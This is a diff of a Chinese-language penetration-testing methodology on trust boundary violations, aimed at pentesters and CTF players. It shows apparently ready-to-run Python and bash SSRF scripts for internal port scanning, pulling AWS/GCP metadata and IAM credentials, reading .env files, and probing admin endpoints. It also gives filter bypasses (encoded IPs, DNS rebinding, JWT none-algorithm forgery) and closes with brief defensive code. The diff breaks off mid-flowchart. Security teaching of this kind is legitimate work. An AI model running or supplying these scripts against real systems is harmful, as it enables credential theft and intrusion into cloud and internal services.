@@ -1,557 +1,626 @@
-# 信任边界违规（Trust Boundary Violation）利用
+# 信任边界违规攻击方法论
 
-## 1. 技术介绍
+## 1. 文档概述
 
-### 1.1 漏洞原理
+### 1.1 编写目的
+本方法论旨在为渗透测试人员提供针对**信任边界设计缺陷**进行攻击的标准化流程。重点讲解如何利用仅依赖网络隔离而无应用层认证的设计缺陷，通过 SSRF 等手段绕过信任边界访问内部服务。
 
-信任边界违规（Trust Boundary Violation）发生在应用程序错误地信任来自不同信任级别的数据时。当数据跨越信任边界（如从外部网络到内部网络、从客户端到服务器、从用户空间到内核空间）时，应用程序未进行适当的验证或转换。
+### 1.2 适用范围
+- 适用于 Docker 容器化部署的微服务应用
+- 适用于仅依赖网络隔离而无应用层认证的系统
+- 适用于存在 SSRF 漏洞且可访问内部服务的场景
+- 适用于云环境元数据服务可通过 SSRF 访问的场景
+- 适用于 Flask、Django、FastAPI 等 Python Web 框架应用
 
-### 1.2 漏洞本质
-
-信任边界违规的本质是**架构设计缺陷**：应用程序假设某些边界（如网络隔离、防火墙规则）足以保护资源，而忽略了应用层攻击可以绕过这些边界。
-
-### 1.3 常见信任边界
-
-| 边界类型 | 边界描述 | 常见违规场景 |
-|---------|---------|-------------|
-| 网络边界 | 外部网络 ↔ 内部网络 | SSRF 绕过网络隔离 |
-| 应用边界 | 客户端 ↔ 服务器端 | 客户端输入未验证 |
-| 权限边界 | 普通用户 ↔ 管理员 | 权限检查缺失 |
-| 数据边界 | 可信数据 ↔ 用户数据 | 混合数据处理 |
-| 服务边界 | 服务 A ↔ 服务 B | 服务间无认证 |
-
-### 1.4 案例分析
-
-典型的信任边界违规：
-
-**架构设计：**
-```
-外部用户 → web-app (PUBLIC) → internal-service (PRIVATE)
-                                    ↑
-                            仅依赖网络隔离
-                            无应用层认证
-```
-
-**信任边界：**
-- **预期边界：** Docker 网络隔离保护 internal-service
-- **实际边界：** 无应用层验证，仅网络层隔离
-- **违规方式：** SSRF 绕过网络隔离
-
-**攻击路径：**
-```
-1. 攻击者访问外部端点：http://localhost:34287/redirect.php?url=http://internal-service/
-2. web-app 执行 file_get_contents("http://internal-service/")
-3. 请求跨越网络边界到达 internal-service
-4. internal-service 信任所有 Docker 网络内请求
-5. 返回敏感 FLAG 数据
-```
+### 1.3 读者对象
+- 执行渗透测试的安全工程师
+- 进行架构安全评估的分析师
+- CTF 参赛选手
+- 应用安全研究人员
 
 ---
 
-## 2. 攻击常见于哪些业务场景
+## 2. 技术专题：信任边界违规攻击
 
-### 2.1 常见业务场景
+### 2.1 技术介绍
+
+**漏洞原理：**
+当应用架构设计仅依赖网络隔离（如 Docker 容器网络、VPC 网络）作为安全边界，而无应用层认证时：
+1. 一旦攻击者突破网络隔离（如通过 SSRF），即可无阻碍访问内部服务
+2. 内部服务通常假设"在内部网络=可信"，无认证机制
+3. 敏感数据（如元数据、内部 API）可被直接访问
+4. 可实施权限提升、横向移动等攻击
+
+**本质：**
+- **架构层面**：错误地将网络边界等同于信任边界
+- **设计层面**：缺乏纵深防御，单一安全控制（网络隔离）
+- **认证层面**：内部服务无应用层认证，仅依赖网络位置
+
+**技术特征：**
+```python
+# 信任边界违规架构特征
+- Docker 容器内服务无应用层认证
+- 仅依赖 Docker 网络隔离作为安全控制
+- 内部服务监听 localhost 或容器网络 IP
+- 无认证装饰器（@login_required）
+- 无 API 密钥验证
+- 无 JWT/Token 验证
+
+# 网络隔离特征
+- 容器网络：10.x.x.x、172.17.x.x、172.18.x.x
+- VPC 网络：10.x.x.x、192.168.x.x
+- 内部服务仅监听 127.0.0.1 或内网 IP
+```
+
+### 2.2 攻击常见于哪些业务场景
 
 | 业务场景 | 功能示例 | 风险点描述 |
 |---------|---------|-----------|
-| 微服务架构 | 服务间通信 | 假设网络隔离足够，无服务间认证 |
-| 云原生应用 | VPC 内网通信 | 假设 VPC 隔离安全，无应用层验证 |
-| Docker/K8s | 容器间通信 | 假设网络策略足够，无 mTLS |
-| API 网关 | 后端服务调用 | 假设网关认证足够，后端无验证 |
-| 内部工具 | 管理后台 | 假设内网安全，无登录机制 |
-| 代理/转发 | URL 转发器 | 信任用户提供的 URL |
-| Webhook 服务 | 回调通知 | 信任回调地址 |
-| 文件处理 | 远程文件抓取 | 信任用户提供的文件 URL |
+| Docker 微服务架构 | 容器化后端服务 | 容器间仅依赖网络隔离，无服务间认证 |
+| 云原生应用 | AWS/GCP/Azure 部署 | 元数据服务可通过 SSRF 访问 |
+| CTF 挑战环境 | 安全培训平台 | 故意设计信任边界违规供学习 |
+| 内部管理系统 | 内网管理后台 | 假设内网安全而无认证 |
+| API 网关架构 | 微服务 API 网关 | 网关后服务无认证，依赖网关鉴权 |
+| Serverless 架构 | Lambda/Cloud Functions | 函数间调用无认证 |
 
-### 2.2 微服务信任边界违规
+### 2.3 漏洞探测方法
 
-**场景描述：**
-```
-用户 → API Gateway → Service A → Service B → Database
-       (认证)      (信任网关)  (信任 A)   (信任 B)
-```
+#### 2.3.1 网络架构侦察
 
-**风险点：**
-- Service B 假设所有请求都经过认证
-- 如果攻击者绕过网关直接访问 Service B，无认证检查
-- 服务间无 mTLS 或 API Key 验证
-
-**利用方法：**
+**步骤 1：识别容器化部署**
 ```bash
-# 直接访问内部服务（如果网络可达）
-curl http://service-b:8080/api/sensitive-data
+# 检查响应头
+curl -I http://target:38583/
 
-# 或通过 SSRF 访问
-curl "http://gateway/proxy?url=http://service-b:8080/api/sensitive-data"
+# 容器化特征：
+# Server: Werkzeug/1.0.1 Python/2.7.18
+# 可能包含容器相关信息
 ```
 
-### 2.3 云环境信任边界违规
-
-**场景描述：**
-```
-外部用户 → Load Balancer → EC2 Instance → RDS Database
-           (安全组)       (安全组)       (安全组)
-```
-
-**风险点：**
-- 假设安全组足够保护资源
-- 实例元数据服务无认证（169.254.169.254）
-- SSRF 可访问元数据获取 IAM 凭证
-
-**利用方法：**
+**步骤 2：探测内部网络结构**
 ```bash
-# 访问 EC2 元数据
-curl "http://target.com/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
+# 如果存在 SSRF，探测内部网络
+# 测试 localhost
+curl "http://target:38583/ssrf?url=http://127.0.0.1:5000/"
 
-# 获取临时凭证
-# 使用凭证访问 AWS 资源
+# 测试容器网络
+curl "http://target:38583/ssrf?url=http://10.89.80.2:5000/"
+
+# 测试常见内部端口
+curl "http://target:38583/ssrf?url=http://127.0.0.1:8080/"
+curl "http://target:38583/ssrf?url=http://127.0.0.1:9000/"
 ```
 
-### 2.4 Docker 环境信任边界违规
-
-**场景描述：**
-```
-外部用户 → web-app (端口暴露) → internal-service (仅 Docker 网络)
-```
-
-**风险点：**
-- 假设 Docker 网络隔离足够
-- internal-service 无应用层认证
-- SSRF 可绕过网络隔离
-
-**利用方法：**
+**步骤 3：识别无认证内部服务**
 ```bash
-# 利用 SSRF 访问内部服务
-curl "http://web-app:34287/redirect.php?url=http://internal-service/"
+# 如果可访问内部服务，检查是否需要认证
+curl http://internal-service:5000/admin
+curl http://internal-service:5000/api/users
 
-# 获取敏感信息
-# 响应包含 FLAG{...}
+# 预期结果（无认证）：
+# HTTP 200 OK（直接访问成功）
+# 无 401 Unauthorized
+# 无 302 重定向到登录页
+```
+
+#### 2.3.2 代码审计检测
+
+**检测无认证架构：**
+```python
+# 搜索认证相关代码
+grep -rn "@login_required\|@auth_required\|@requires_auth" /src/
+
+# 搜索会话管理
+grep -rn "session\[" /src/
+grep -rn "from flask import session" /src/
+
+# 搜索 SECRET_KEY 配置
+grep -rn "secret_key\|SECRET_KEY" /src/
+
+# 预期结果（无认证架构）：无匹配
+```
+
+**检测 SSRF 漏洞：**
+```python
+# 搜索 HTTP 客户端调用
+grep -rn "requests\.get\|requests\.post\|urllib\.request" /src/
+grep -rn "fetch\|http\.client" /src/
+
+# 搜索 PhantomJS/无头浏览器调用
+grep -rn "phantomjs\|selenium\|webdriver" /src/
+
+# 检查 URL 验证
+grep -rn "url.*validate\|validate.*url" /src/
+```
+
+#### 2.3.3 云环境检测
+
+**AWS 元数据服务检测：**
+```bash
+# 如果存在 SSRF，尝试访问 AWS 元数据
+curl "http://target:38583/ssrf?url=http://169.254.169.254/latest/meta-data/"
+
+# 预期响应（AWS 环境）：
+# ami-id
+# instance-id
+# iam/security-credentials/
+```
+
+**GCP 元数据服务检测：**
+```bash
+# GCP 元数据服务
+curl "http://target:38583/ssrf?url=http://metadata.google.internal/computeMetadata/v1/" \
+  -H "Metadata-Flavor: Google"
+```
+
+### 2.4 漏洞利用方法
+
+#### 2.4.1 SSRF 绕过网络隔离
+
+**场景 1：通过 SSRF 访问内部 Flask 服务**
+
+```python
+#!/usr/bin/env python3
+"""
+SSRF 信任边界违规攻击脚本
+通过 SSRF 访问无认证的内部服务
+"""
+
+import requests
+
+def ssrf_internal_scan(target_url, internal_ip, ports):
+    """
+    使用 SSRF 扫描内部服务
+    """
+    print(f"[*] Scanning internal network via SSRF...")
+    print(f"[*] Target internal IP: {internal_ip}")
+
+    open_ports = []
+
+    for port in ports:
+        try:
+            # 构造 SSRF payload
+            ssrf_url = f"http://{internal_ip}:{port}/"
+            payload = {
+                'url': ssrf_url
+            }
+
+            # 发送 SSRF 请求
+            response = requests.post(target_url, data=payload, timeout=5)
+
+            # 根据响应判断端口是否开放
+            if response.status_code == 200 or response.status_code == 404:
+                open_ports.append(port)
+                print(f"[+] Port {port} OPEN - {response.status_code}")
+            elif response.status_code == 429 or 'connection refused' in response.text.lower():
+                print(f"[-] Port {port} CLOSED")
+
+        except requests.exceptions.Timeout:
+            print(f"[!] Port {port} TIMEOUT")
+        except Exception as e:
+            print(f"[!] Port {port} ERROR: {e}")
+
+    return open_ports
+
+def ssrf_access_internal_service(target_url, internal_url):
+    """
+    使用 SSRF 访问内部服务
+    """
+    print(f"[*] Accessing internal service: {internal_url}")
+
+    payload = {'url': internal_url}
+    response = requests.post(target_url, data=payload)
+
+    print(f"[*] Response status: {response.status_code}")
+    print(f"[*] Response length: {len(response.text)}")
+
+    # 检查是否包含敏感信息
+    sensitive_keywords = ['flag', 'secret', 'key', 'password', 'token', 'admin']
+    for keyword in sensitive_keywords:
+        if keyword.lower() in response.text.lower():
+            print(f"[+] Found sensitive keyword: {keyword}")
+
+    return response.text
+
+if __name__ == "__main__":
+    # 目标 SSRF 端点
+    target = "http://localhost:38583/page"
+
+    # 内部网络扫描
+    common_ports = [80, 443, 5000, 8000, 8080, 8888, 9000, 9090]
+
+    # 扫描 localhost
+    print("\n=== Scanning localhost ===")
+    ssrf_internal_scan(target, "127.0.0.1", common_ports)
+
+    # 扫描容器网络
+    print("\n=== Scanning container network ===")
+    ssrf_internal_scan(target, "10.89.80.2", common_ports)
+
+    # 访问内部服务
+    print("\n=== Accessing internal services ===")
+    ssrf_access_internal_service(target, "http://127.0.0.1:5000/admin")
+    ssrf_access_internal_service(target, "http://127.0.0.1:5000/api/flag")
+```
+
+#### 2.4.2 访问云元数据服务
+
+**场景 2：AWS 元数据服务访问**
+
+```bash
+#!/bin/bash
+# AWS 元数据服务 SSRF 攻击脚本
+
+TARGET="http://target:38583/page"
+
+# 访问实例元数据
+echo "=== Instance Metadata ==="
+curl "$TARGET?name=<body%20onload=\"fetch('http://169.254.169.254/latest/meta-data/instance-id').then(r=>r.text()).then(d=>alert(d))\">"
+
+# 访问 IAM 角色凭证
+echo "=== IAM Credentials ==="
+curl "$TARGET?name=<body%20onload=\"fetch('http://169.254.169.254/latest/meta-data/iam/security-credentials/').then(r=>r.text()).then(d=>alert(d))\">"
+
+# 访问用户数据
+echo "=== User Data ==="
+curl "$TARGET?name=<body%20onload=\"fetch('http://169.254.169.254/latest/user-data').then(r=>r.text()).then(d=>alert(d))\">"
+```
+
+**Python 版本：**
+```python
+#!/usr/bin/env python3
+"""
+AWS 元数据服务 SSRF 攻击脚本
+"""
+
+import requests
+import re
+
+def extract_aws_metadata(ssrf_endpoint):
+    """
+    通过 SSRF 提取 AWS 元数据
+    """
+
+    metadata_paths = [
+        'latest/meta-data/instance-id',
+        'latest/meta-data/ami-id',
+        'latest/meta-data/iam/security-credentials/',
+        'latest/meta-data/local-ipv4',
+        'latest/meta-data/public-hostname',
+        'latest/user-data',
+    ]
+
+    base_metadata_url = "http://169.254.169.254/"
+
+    for path in metadata_paths:
+        print(f"\n[*] Fetching: {path}")
+
+        # 构造 XSS payload 通过 SSRF 访问
+        metadata_url = base_metadata_url + path
+        payload = f"<body onload=\"fetch('{metadata_url}').then(r=>r.text()).then(d=>console.log(d))\">"
+
+        try:
+            response = requests.get(ssrf_endpoint, params={'name': payload})
+
+            # 提取元数据（实际场景中需要从响应解析）
+            if 'i-' in response.text:  # EC2 实例 ID 前缀
+                instance_id = re.search(r'i-[a-f0-9]+', response.text)
+                if instance_id:
+                    print(f"[+] Instance ID: {instance_id.group()}")
+
+        except Exception as e:
+            print(f"[!] Error fetching {path}: {e}")
+
+if __name__ == "__main__":
+    extract_aws_metadata("http://localhost:38583/page")
+```
+
+#### 2.4.3 权限提升攻击
+
+**场景 3：通过 SSRF 访问内部管理端点**
+
+```python
+#!/usr/bin/env python3
+"""
+SSRF 垂直权限提升攻击脚本
+通过 SSRF 访问内部管理功能实现权限提升
+"""
+
+import requests
+
+def vertical_privilege_escalation(ssrf_endpoint, internal_admin_url):
+    """
+    通过 SSRF 访问内部管理端点实现权限提升
+    """
+
+    print(f"[*] Attempting vertical privilege escalation via SSRF")
+    print(f"[*] Internal admin URL: {internal_admin_url}")
+
+    # 管理端点列表
+    admin_endpoints = [
+        '/admin',
+        '/admin/dashboard',
+        '/admin/users',
+        '/admin/config',
+        '/api/admin/users',
+        '/api/admin/config',
+        '/management',
+        '/actuator',
+    ]
+
+    for endpoint in admin_endpoints:
+        target_url = internal_admin_url + endpoint
+
+        print(f"\n[*] Trying: {target_url}")
+
+        # 构造 SSRF payload
+        payload = f"<body onload=\"fetch('{target_url}').then(r=>r.text()).then(d=>console.log(d))\">"
+
+        try:
+            response = requests.get(ssrf_endpoint, params={'name': payload})
+
+            if response.status_code == 200:
+                print(f"[+] Successfully accessed: {endpoint}")
+
+                # 检查是否包含敏感信息
+                if 'flag' in response.text.lower() or 'secret' in response.text.lower():
+                    print(f"[+] Found sensitive data in response!")
+                    print(f"    Response preview: {response.text[:200]}")
+
+        except Exception as e:
+            print(f"[!] Error accessing {endpoint}: {e}")
+
+if __name__ == "__main__":
+    ssrf_endpoint = "http://localhost:38583/page"
+    internal_base = "http://127.0.0.1:5000"
+
+    vertical_privilege_escalation(ssrf_endpoint, internal_base)
+```
+
+#### 2.4.4 组合攻击场景
+
+**场景 4：SSRF + 无认证架构组合攻击**
+
+```
+攻击链：
+1. 识别目标应用存在 SSRF 漏洞
+2. 通过 SSRF 扫描内部网络，发现无认证的内部服务
+3. 利用 SSRF 访问内部服务，提取敏感数据
+4. 如果内部服务有管理功能，实现权限提升
+
+具体步骤：
+```
+
+```python
+#!/usr/bin/env python3
+"""
+SSRF + 无认证架构组合攻击脚本
+"""
+
+import requests
+from urllib.parse import quote
+
+class SSRFAttack:
+    def __init__(self, ssrf_endpoint):
+        self.ssrf_endpoint = ssrf_endpoint
+        self.session = requests.Session()
+
+    def scan_internal_ports(self, target_ip, ports):
+        """扫描内部端口"""
+        open_ports = []
+
+        for port in ports:
+            url = f"http://{target_ip}:{port}/"
+            payload = f"<body onload=\"fetch('{url}').then(r=>alert('OPEN'))\">"
+
+            try:
+                response = self.session.get(self.ssrf_endpoint, params={'name': payload}, timeout=3)
+
+                if 'OPEN' in response.text or response.status_code == 200:
+                    open_ports.append(port)
+                    print(f"[+] Port {port} is OPEN")
+
+            except:
+                pass
+
+        return open_ports
+
+    def fetch_internal_resource(self, url):
+        """获取内部资源"""
+        payload = f"<body onload=\"fetch('{url}').then(r=>r.text()).then(d=>alert(d))\">"
+
+        try:
+            response = self.session.get(self.ssrf_endpoint, params={'name': payload})
+            return response.text
+        except Exception as e:
+            return f"Error: {e}"
+
+    def extract_flag(self):
+        """提取 Flag"""
+        # 尝试常见 Flag 位置
+        flag_paths = [
+            'http://127.0.0.1:5000/flag',
+            'http://127.0.0.1:5000/FLAG',
+            'http://127.0.0.1:5000/flag.txt',
+            'http://127.0.0.1:5000/api/flag',
+            'file:///flag.txt',
+            'file:///FLAG.txt',
+        ]
+
+        for path in flag_paths:
+            print(f"[*] Trying to fetch: {path}")
+            result = self.fetch_internal_resource(path)
+
+            if 'FLAG{' in result or 'flag{' in result:
+                print(f"[+] FLAG FOUND: {result}")
+                return result
+
+        return None
+
+def main():
+    attacker = SSRFAttack("http://localhost:38583/page")
+
+    # 步骤 1：扫描内部端口
+    print("=== Step 1: Internal Port Scan ===")
+    common_ports = [80, 443, 5000, 8000, 8080, 9000]
+    open_ports = attacker.scan_internal_ports("127.0.0.1", common_ports)
+
+    # 步骤 2：提取 Flag
+    print("\n=== Step 2: Extract Flag ===")
+    flag = attacker.extract_flag()
+
+    if flag:
+        print(f"\n[SUCCESS] Flag captured: {flag}")
+    else:
+        print("\n[-] Flag not found")
+
+if __name__ == "__main__":
+    main()
+```
+
+### 2.5 漏洞利用绕过方法
+
+#### 2.5.1 绕过 SSRF 过滤
+
+**IP 地址绕过：**
+```python
+# 如果过滤 127.0.0.1，使用其他表示方式
+bypass_payloads = [
+    "http://localhost:5000/",      # 使用 localhost
+    "http://0.0.0.0:5000/",        # 使用 0.0.0.0
+    "http://[::1]:5000/",          # 使用 IPv6
+    "http://2130706433:5000/",     # 使用十进制 IP (127.0.0.1)
+    "http://0177.0.0.1:5000/",     # 使用八进制 IP
+    "http://0x7f.0x00.0x00.0x01:5000/",  # 使用十六进制 IP
+]
+```
+
+**DNS 重绑定攻击：**
+```
+如果 SSRF 过滤 IP 地址，可使用 DNS 重绑定：
+
+1. 注册域名 attacker.com
+2. 配置 DNS：
+   - 第一次解析：公网 IP（绕过初始检查）
+   - 第二次解析：127.0.0.1（实际请求目标）
+3. 利用时间差绕过 SSRF 防护
+```
+
+#### 2.5.2 绕过网络分段
+
+**多层 SSRF 攻击：**
+```
+如果目标在多层网络后：
+
+1. 第一层 SSRF：访问 DMZ 区域服务
+2. 从 DMZ 服务发起第二层 SSRF：访问内部网络
+3. 逐步深入，最终访问目标服务
 ```
 
 ---
 
-## 3. 漏洞探测方法
+## 3. 附录
 
-### 3.1 黑盒测试
+### 3.1 常用攻击工具速查表
 
-#### 3.1.1 网络边界探测
+| 工具名称 | 用途 | 使用示例 |
+|---------|------|---------|
+| curl | HTTP 请求 | `curl http://target/ssrf?url=http://127.0.0.1:5000/` |
+| Burp Suite | SSRF 扫描 | Scanner → SSRF 检测 |
+| SSRFmap | SSRF 自动化 | `python ssrfmap.py -t target -m internal_scan` |
+| Gopherus | SSRF 利用 | `python gopherus.py --exploit` |
+| requests (Python) | HTTP 请求库 | 自定义 SSRF 脚本 |
+| Scapy (Python) | 网络包处理 | 网络层攻击脚本 |
 
-**测试内部服务可访问性：**
-```bash
-# 直接访问内部服务（如果网络可达）
-curl http://internal-service/
-curl http://10.0.0.2/
-curl http://172.16.0.2/
+### 3.2 信任边界检测清单
 
-# 通过 SSRF 探测
-curl "http://web-app/proxy?url=http://internal-service/"
+| 检测项 | 检测方法 | 不安全标志 |
+|-------|---------|-----------|
+| 内部服务认证 | 直接访问内部端点 | HTTP 200 无认证 |
+| 网络隔离依赖 | 架构审查 | 仅依赖 Docker/VPC 网络 |
+| SSRF 漏洞 | 输入点测试 | URL 参数可控制请求 |
+| 云元数据可访问 | SSRF 测试 | 可访问 169.254.169.254 |
+| 容器网络暴露 | 端口扫描 | 容器网络 IP 可访问 |
+| 认证装饰器缺失 | 代码审计 | 无@login_required |
+| SECRET_KEY 未配置 | 代码审计 | 无 secret_key 配置 |
+
+### 3.3 防御建议
+
+**实施应用层认证：**
+```python
+# Flask 应用添加认证
+from flask import Flask, session, redirect, url_for
+from functools import wraps
+
+app = Flask(__name__)
+app.secret_key = 'your-secret-key'  # 配置安全密钥
+
+def login_required(f):
+    @wraps(f)
+    def decorated_function(*args, **kwargs):
+        if 'user_id' not in session:
+            return redirect(url_for('login'))
+        return f(*args, **kwargs)
+    return decorated_function
+
+@app.route('/admin')
+@login_required
+def admin():
+    return render_template('admin.html')
 ```
 
-**测试服务间通信：**
-```bash
-# 枚举内部服务名
-curl "http://web-app/proxy?url=http://api-gateway/"
-curl "http://web-app/proxy?url=http://user-service/"
-curl "http://web-app/proxy?url=http://database-admin/"
+**SSRF 防护：**
+```python
+# URL 验证和过滤
+import socket
+import ipaddress
+
+def is_safe_url(url):
+    """检查 URL 是否安全（不指向内网）"""
+    from urllib.parse import urlparse
+    import socket
+
+    parsed = urlparse(url)
+    hostname = parsed.hostname
+
+    try:
+        # 解析 IP 地址
+        ip = socket.gethostbyname(hostname)
+
+        # 检查是否为内网 IP
+        ip_obj = ipaddress.ip_address(ip)
+
+        # 拒绝私有 IP 和回环地址
+        if ip_obj.is_private or ip_obj.is_loopback or ip_obj.is_link_local:
+            return False
+
+        return True
+    except:
+        return False
+
+# 使用示例
+@app.route('/fetch')
+def fetch():
+    url = request.args.get('url')
+
+    if not is_safe_url(url):
+        return "Invalid URL", 400
+
+    response = requests.get(url)
+    return response.text
 ```
 
-#### 3.1.2 应用层认证检测
-
-**检测内部服务认证：**
-```bash
-# 直接访问内部服务
-curl -I http://internal-service/
-# 观察响应头
-# 200 OK → 无认证
-# 401 Unauthorized → 有认证
-# 403 Forbidden → 有授权
+**纵深防御架构：**
 ```
-
-**检测服务间认证机制：**
-```bash
-# 检查是否需要 API Key
-curl -H "X-API-Key: test" http://internal-service/
-
-# 检查是否需要 Bearer Token
-curl -H "Authorization: Bearer test" http://internal-service/
-
-# 检查是否需要特定 Header
-curl -H "X-Internal-Request: true" http://internal-service/
-```
-
-#### 3.1.3 信任边界识别
-
-**识别信任假设：**
-```
-1. 应用是否假设某些请求是"可信的"？
-2. 是否有基于来源 IP 的信任？
-3. 是否有基于 Header 的信任？
-4. 是否有基于网络位置的信任？
-```
-
-**检测基于 IP 的信任：**
-```bash
-# 测试 X-Forwarded-For 头
-curl -H "X-Forwarded-For: 127.0.0.1" http://target.com/admin
-
-# 测试 X-Real-IP 头
-curl -H "X-Real-IP: 10.0.0.1" http://target.com/internal
-```
-
-**检测基于 Header 的信任：**
-```bash
-# 测试内部请求头
-curl -H "X-Internal-Request: true" http://target.com/api/admin
-
-# 测试服务间头
-curl -H "X-Service-Name: trusted-service" http://target.com/api/data
-```
-
-### 3.2 白盒测试
-
-#### 3.2.1 代码审计关键词
-
-**搜索信任假设：**
-```bash
-# 搜索基于 IP 的信任
-grep -rn "127.0.0.1\|localhost\|10\.\|172\.16\|192\.168" *.php *.py *.java
-
-# 搜索基于 Header 的信任
-grep -rn "X-Internal\|X-Service\|X-Admin\|X- Trusted" *.php *.py *.java
-
-# 搜索网络边界假设
-grep -rn "internal\|private\|local" *.php *.py *.java
-```
-
-**检测缺失的验证：**
-```bash
-# PHP：搜索缺失的认证检查
-grep -rn "if.*isset.*_SESSION\|if.*authenticated" *.php
-
-# Python：搜索缺失的装饰器
-grep -rn "@login_required\|@auth_required" *.py
-
-# Java：搜索缺失的注解
-grep -rn "@PreAuthorize\|@RolesAllowed" *.java
-```
-
-#### 3.2.2 架构分析
-
-**绘制信任边界图：**
-```
-┌─────────────────────────────────────────────────────┐
-│                  外部网络 (Untrusted)                │
-│                      ↓                              │
-│  ┌─────────────┐    │                               │
-│  │  Firewall   │    │                               │
-│  └─────────────┘    │                               │
-│                      ↓                              │
-│  ┌─────────────────────────────────────────────┐   │
-│  │         DMZ (Partially Trusted)             │   │
-│  │  ┌─────────────┐                            │   │
-│  │  │  Web Server │                            │   │
-│  │  └─────────────┘                            │   │
-│  └─────────────────────────────────────────────┘   │
-│                      ↓                              │
-│  ┌─────────────────────────────────────────────┐   │
-│  │         内部网络 (Trusted)                   │   │
-│  │  ┌─────────────┐  ┌─────────────┐          │   │
-│  │  │ App Server  │→ │ DB Server   │          │   │
-│  │  └─────────────┘  └─────────────┘          │   │
-│  └─────────────────────────────────────────────┘   │
-└─────────────────────────────────────────────────────┘
-
-信任边界违规点：
-1. Web Server → App Server（无认证）
-2. App Server → DB Server（弱认证）
-3. 内部网络假设所有内部请求可信
+推荐架构：
+1. 网络层：VPC/容器网络隔离
+2. 认证层：所有服务实施认证（JWT/API Key/mTLS）
+3. 授权层：细粒度权限控制
+4. 监控层：异常访问检测和告警
 ```
 
 ---
 
-## 4. 漏洞利用方法
-
-### 4.1 SSRF 绕过网络隔离
-
-#### 4.1.1 Docker 环境 SSRF
-
-```bash
-# 利用 web-app 作为跳板
-curl "http://web-app:34287/redirect.php?url=http://internal-service/"
-
-# 获取内部服务敏感信息
-# 响应：FLAG{...}
-```
-
-#### 4.1.2 K8s 环境 SSRF
-
-```bash
-# 访问 K8s API Server
-curl "http://target.com/proxy?url=http://kubernetes.default/"
-
-# 访问 K8s 元数据
-curl "http://target.com/proxy?url=http://169.254.169.254/computeMetadata/v1/"
-```
-
-### 4.2 服务间认证绕过
-
-#### 4.2.1 直接访问内部服务
-
-```bash
-# 如果网络可达且无认证
-curl http://internal-service:8080/api/admin/users
-curl http://database-admin:5432/api/config
-```
-
-#### 4.2.2 伪造服务间请求头
-
-```bash
-# 伪造内部请求头
-curl -H "X-Internal-Request: true" http://internal-service/api/data
-curl -H "X-Service-Name: trusted-service" http://internal-service/api/data
-curl -H "X-Forwarded-For: 10.0.0.1" http://internal-service/api/data
-```
-
-### 4.3 云元数据服务利用
-
-#### 4.3.1 AWS EC2 元数据
-
-```bash
-# 获取实例元数据
-curl "http://target.com/fetch?url=http://169.254.169.254/latest/meta-data/"
-
-# 获取 IAM 角色凭证
-curl "http://target.com/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/role-name"
-
-# 使用凭证访问 S3
-aws s3 ls --access-key <access-key> --secret-key <secret-key>
-```
-
-#### 4.3.2 GCP 元数据
-
-```bash
-# 获取项目信息
-curl "http://target.com/fetch?url=http://metadata.google.internal/computeMetadata/v1/project/"
-
-# 获取服务账户令牌
-curl "http://target.com/fetch?url=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
-```
-
-### 4.4 敏感信息提取
-
-#### 4.4.1 内部服务信息
-
-```bash
-# 获取内部服务配置
-curl "http://web-app/proxy?url=http://internal-service/config"
-
-# 获取数据库连接信息
-curl "http://web-app/proxy?url=http://internal-service/db-config"
-```
-
-#### 4.4.2 源代码/配置文件
-
-```bash
-# 读取应用配置
-curl "http://web-app/proxy?url=file:///app/.env"
-curl "http://web-app/proxy?url=file:///var/www/html/config.php"
-```
-
-### 4.5 组合攻击
-
-#### 4.5.1 SSRF + 无认证 + 敏感信息
-
-```bash
-# 1. 利用 SSRF 访问内部服务
-# 2. 内部服务无认证
-# 3. 获取敏感数据
-
-curl "http://web-app:34287/redirect.php?url=http://internal-service/" | grep -o "FLAG{.*}"
-```
-
-#### 4.5.2 SSRF + 端口扫描 + 服务识别
-
-```bash
-# 扫描内部服务端口
-for port in 80 443 3000 5000 8080 8443 9200; do
-    curl -s --max-time 2 "http://web-app/proxy?url=http://internal-service:$port/" &
-done
-
-# 识别开放端口和服务
-```
-
----
-
-## 5. 漏洞利用绕过方法
-
-### 5.1 绕过网络访问控制
-
-#### 5.1.1 DNS 重绑定
-
-```bash
-# 使用 DNS 重绑定服务
-curl "http://bindattacker.com/"
-
-# 第一次 DNS 查询：返回外部 IP（通过检查）
-# 第二次 DNS 查询：返回内部 IP（实际请求）
-```
-
-#### 5.1.2 IPv6 映射
-
-```bash
-# 利用 IPv6 映射到 IPv4
-curl "http://[::ffff:127.0.0.1]/"
-curl "http://[::ffff:10.0.0.1]/"
-```
-
-### 5.2 绕过 IP 检查
-
-#### 5.2.1 IP 地址编码
-
-```bash
-# 八进制
-curl "http://0177.0.0.1/"
-
-# 十六进制
-curl "http://0x7f000001/"
-
-# 十进制
-curl "http://2130706433/"
-```
-
-#### 5.2.2 URL 解析不一致
-
-```bash
-# 利用@符号
-curl "http://allowed.com@127.0.0.1/"
-# 某些解析器认为是 127.0.0.1，某些认为是 allowed.com
-
-# 利用路径混淆
-curl "http://127.0.0.1/@allowed.com/"
-```
-
-### 5.3 绕过 Header 检查
-
-#### 5.3.1 Header 规范化绕过
-
-```bash
-# 大小写混合
-curl -H "x-internal-request: true" http://target.com/
-curl -H "X-INTERNAL-REQUEST: true" http://target.com/
-
-# 添加空格
-curl -H "X-Internal-Request:  true" http://target.com/
-curl -H "X-Internal-Request : true" http://target.com/
-```
-
-#### 5.3.2 多 Header 注入
-
-```bash
-# 注入多个同名 Header
-curl -H "X-Internal-Request: false" -H "X-Internal-Request: true" http://target.com/
-```
-
-### 5.4 绕过服务认证
-
-#### 5.4.1 JWT 令牌伪造
-
-```bash
-# 如果服务间使用 JWT 但验证薄弱
-# 使用 None 算法
-curl -H "Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJyb2xlIjoiYWRtaW4ifQ." http://internal-service/
-```
-
-#### 5.4.2 API Key 猜测
-
-```bash
-# 尝试常见 API Key
-curl -H "X-API-Key: admin" http://internal-service/
-curl -H "X-API-Key: internal" http://internal-service/
-curl -H "X-API-Key: service" http://internal-service/
-```
-
----
-
-## 6. 渗透测试决策流程
-
-```
-                                    ┌─────────────────┐
-                                    │  信任边界违规测试 │
-                                    └────────┬────────┘
-                                             │
-                                             ▼
-                                    ┌─────────────────┐
-                                    │   架构分析       │
-                                    │  - 绘制信任边界  │
-                                    │  - 识别服务依赖  │
-                                    │  - 分析网络拓扑  │
-                                    └────────┬────────┘
-                                             │
-                    ┌────────────────────────┼────────────────────────┐
-                    │                        │                        │
